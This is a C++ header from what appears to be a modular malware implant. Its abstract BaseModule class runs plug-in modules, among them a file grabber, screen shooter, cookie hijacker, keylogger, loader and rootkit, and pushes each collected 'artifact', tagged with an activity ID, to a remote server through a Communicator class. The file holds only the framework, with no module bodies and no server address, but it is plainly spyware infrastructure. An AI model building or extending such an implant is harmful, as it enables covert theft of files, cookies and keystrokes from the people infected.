#pragma once

#include <stdio.h>
#include <iostream>
#include "../include/json.hpp"
#include "../Utils/CryptoUtils.h"
#include "../Communicator/Communicator.h"

/*

BaseModule is a pure virtual class. 
Each derived class shall call BaseModule("derived_module_class_type") c'tor,
passing its correspoing arguments. 

*/

#define MAX_ARTIFACTS 1

typedef enum SupportedModules {
        FILE_GRABBER=0,
        SCREEN_SHOOTER,
        COOKIE_HIJACKER,
        KEY_LOGGER,
        LOADER,
        ROOTKIT,
        NUM_OF_MODULES
    } supported_modules_enum;

using json = nlohmann::json;

#define BYTES unsigned char *
#define ARTIFACT BYTES

typedef json artifact_t;

class BaseModule
{
protected:
    std::string module_type;
    json args;
    std::string activity_id;
    std::vector<json> artifacts;
    bool run_;

    /* Derived classes with override this function */
    virtual void module_impl() = 0;

    /* upon artifact collection, the derived class shall call this method */
    virtual void save_artifact(artifact_t artifact)
    {
        std::cout << "Saving artifact of " << module_type << ": " << artifact.dump() << std::endl;

        if(!artifact.contains(module_type))
        {
            throw std::runtime_error("invalid artifacts " + artifact.dump());
        }

        artifacts.push_back(artifact[module_type]);
        if(artifacts.size() >= MAX_ARTIFACTS)
        {
            std::vector<artifact_t> clone;
            artifacts.swap(clone);
            send_artifacts(clone);
        }
    }

    void send_artifacts(std::vector <artifact_t> artifacts)
    {
        std::cout << "sending " << artifacts.size() << " artifacts" << std::endl;
        json artifacts_array;
        unsigned index = 0;
        for(const artifact_t & a : artifacts)
        {
            artifacts_array.push_back(a);
        }

        json payload;
        payload[module_type] = artifacts_array;
        payload["activity_id"] = activity_id;
        
        std::cout << "Sending artifacts to server: " << payload.dump() << std::endl;

        Communicator::getInstance().send_artifact(&payload);
    }

    // std::string encode_artifacts(artifact_t a)
    // {
    //     return CryptoUtils::base64_encode(a.artifact, a.length);
    // }

private:
    static const char * module_names[];

public:
    const std::string & get_module_type()
    {
        return module_type;
    }

    static supported_modules_enum supported_module_for_name(const std::string & module_name);

    BaseModule(const BaseModule &) = delete;

    BaseModule(std::string mtype, const json & module_args) : args(module_args), module_type(mtype), run_(true) 
    {
        if(args.contains("activity_id"))
        {
            activity_id = args["activity_id"];
            args.erase("activity_id");
        }
    }

    ~BaseModule(){
        /**/
    }

    /*  
    Derived class can override this function to avoid running forever (or until stop is received) 
    This function will be considered as the main function of the module - from an outer world perspective. 
    */
   
    virtual void run()
    {
        std::cout << "Running the " << module_type << " module" << std::endl;
        while (run_)
        {
            module_impl();
        }
    }
    
    virtual void stop()
    {
        run_ = false;
    }

};




